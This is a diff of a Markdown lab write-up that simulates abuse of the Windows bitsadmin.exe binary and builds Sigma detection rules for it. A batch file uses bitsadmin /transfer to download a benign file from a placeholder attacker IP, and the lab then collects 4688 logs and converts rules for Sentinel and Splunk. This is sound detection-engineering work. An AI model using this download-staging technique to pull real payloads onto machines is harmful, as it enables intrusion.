@@ -1,85 +1,81 @@
-⚙️ Lab Setup
+# ⚙️ LOLBAS Lab: bitsadmin.exe Payload Simulation & Detection
 
-Victim Machine: Windows 10 Pro (VM)
+## 🖥️ Lab Setup
+- **Victim Machine**: Windows 10 Pro (VM)  
+- **Attacker Host**: Windows 10 Pro (Host)  
 
-Attacker Host: Windows 10 Pro (Host)
+**Tools Used**:
+- `bitsadmin.exe` (Windows built-in binary)  
+- `calc.exe` (benign process for visibility)  
+- `hello.txt` (benign payload)  
+- `simulate_initial_access.bat` (batch file)  
+- Sigma CLI  
 
-Tools:
+---
 
-bitsadmin.exe (Windows built-in binary)
+## 🔹 Step 1: Create a Benign Payload (Attacker Host)
 
-calc.exe (benign process for visibility)
-
-hello.txt (benign payload)
-
-Batch file: simulate_initial_access.bat
-
-Sigma CLI
-
-🔹 Step 1: Create a Benign Payload
-
-On the attacker host machine:
-
+```powershell
 echo "Hello, LOLBAS Test" > C:\inetpub\wwwroot\hello.txt
 
-🔹 Step 2: Host the File
+````
+## 🔹 Step 2: Host the File
 
-Ensure the file is reachable:
-
+Start the web server:
+```powershell
 Start-Service W3SVC
-
-
-Check in browser:
-
+```
+Verify in browser:
 http://<attacker-ip>/hello.txt
 
-🔹 Step 3: Create Malicious Batch File
+## 🔹 Step 3: Create Malicious Batch File
 
-On the victim VM, create a file simulate_initial_access.bat with:
+On the victim VM, create a file simulate_initial_access.bat:
 
 @echo off
 start calc.exe
 bitsadmin /transfer myDownloadJob /download /priority normal http://<attacker-ip>/hello.txt %USERPROFILE%\Downloads\hello.txt
 
 
-This does two things:
+📌 This script:
 
 Opens Calculator (benign distraction).
 
-Downloads hello.txt (simulating a staged payload).
+Uses bitsadmin.exe to download hello.txt into Downloads.
 
-🔹 Step 4: Execute the File
+## 🔹 Step 4: Execute the Batch File
 
-On the VM:
+Run on the victim VM:
 
 simulate_initial_access.bat
 
 
-✅ Calculator opens.
-✅ File downloaded to C:\Users\<user>\Downloads\hello.txt.
+✅ Calculator opens
+✅ hello.txt is downloaded into C:\Users\<user>\Downloads\
 
-🔹 Step 5: Verify File Download
+## 🔹 Step 5: Verify the File Download
+```powershell
 cd %USERPROFILE%\Downloads
 dir hello.txt
+```
 
-🔹 Step 6: Collect Logs (Detection Evidence)
+## 🔹 Step 6: Collect Detection Logs
 
-Use Event Viewer / PowerShell:
+Use PowerShell to extract process creation events (4688):
+```powershell
 
 Get-WinEvent -LogName Security | Where-Object { $_.Id -eq 4688 } | Format-List TimeCreated, Message
+```
+Key Logs Observed:
+cmd.exe launched
 
+bitsadmin.exe executed with /transfer
 
-Key events observed:
+powershell.exe (in related tests)
 
-cmd.exe → launched
+## 🔹 Step 7: Write Sigma Rules
 
-bitsadmin.exe → executed with /transfer
-
-powershell.exe (in related test)
-
-🔹 Step 7: Write Sigma Rules
-
-Three rules were created:
+Three Sigma detection rules were created:
 
 win_bitsadmin_download.yml
 
@@ -87,65 +83,56 @@ win_powershell_iwr_from_cmd.yml
 
 win_powershell_network_download.yml
 
-Example (win_bitsadmin_download.yml):
+Example: win_bitsadmin_download.yml
 
-title: Bitsadmin File Download
-logsource:
-  category: process_creation
-  product: windows
-detection:
-  selection:
-    EventID: 4688
-    NewProcessName|endswith: '\bitsadmin.exe'
-    CommandLine|contains:
-      - '/transfer'
-      - '/download'
-condition: selection
-level: high
+## 🔹 Step 8: Validate Sigma Rules
 
-🔹 Step 8: Validate Rules with Sigma CLI
+Install sigmatools:
+
 pip install sigmatools
 
 
-Validate YAML:
+Validate a Sigma rule:
 
 sigmac -t windows-audit win_bitsadmin_download.yml
 
-🔹 Step 9: Convert to JSON (Sentinel Rule Example)
+## 🔹 Step 9: Convert Rules to JSON (Azure Sentinel)
+
+Generate deployable Sentinel rules:
+
+```powershell
 sigmac -t sentinel-rule win_bitsadmin_download.yml > win_bitsadmin_download.json
 sigmac -t sentinel-rule win_powershell_iwr_from_cmd.yml > win_powershell_iwr_from_cmd.json
 sigmac -t sentinel-rule win_powershell_network_download.yml > win_powershell_network_download.json
-
-
-Now you have deployable JSON alert rules for Azure Sentinel.
-
-🔹 Step 10: (Optional) Convert to Splunk/Sysmon
+```
+## 🔹 Step 10: (Optional) Convert for Splunk / Sysmon
 
 For Splunk:
-
+```powershell
 sigmac -t splunk win_bitsadmin_download.yml
-
+```
 
 For Sysmon:
-
+```powershell
 sigmac -t sysmon win_powershell_network_download.yml
+```
 
-📊 Results
+## 📊 Results
 
-Attack Simulated: .bat file used LOLBAS (bitsadmin) to download payload.
+Attack Simulated: .bat file abused bitsadmin.exe to download a benign payload.
 
-Detection Evidence: Windows Security Event ID 4688 logs.
+Detection Evidence: Windows Event ID 4688 logs (process creation).
 
-Sigma Rules: Created for bitsadmin + PowerShell activity.
+Sigma Rules: Created for bitsadmin.exe and PowerShell download activity.
 
-Converted Outputs: JSON rules ready for Sentinel, SPL queries for Splunk.
+Converted Outputs: JSON rules for Sentinel, SPL queries for Splunk, Sysmon-compatible rules.
 
-✅ Conclusion
+## ✅ Conclusion
 
 This lab demonstrates:
 
-How LOLBAS binaries can be misused for stealthy payload staging.
+How LOLBAS binaries (like bitsadmin.exe) can be abused to stage payloads.
 
-How to detect them with Sigma rules.
+How to detect this activity via Windows Security logs.
 
-How to convert Sigma into platform-specific rules for SIEM integration.
+How to use Sigma rules and convert them for SIEMs (Azure Sentinel, Splunk, Sysmon).
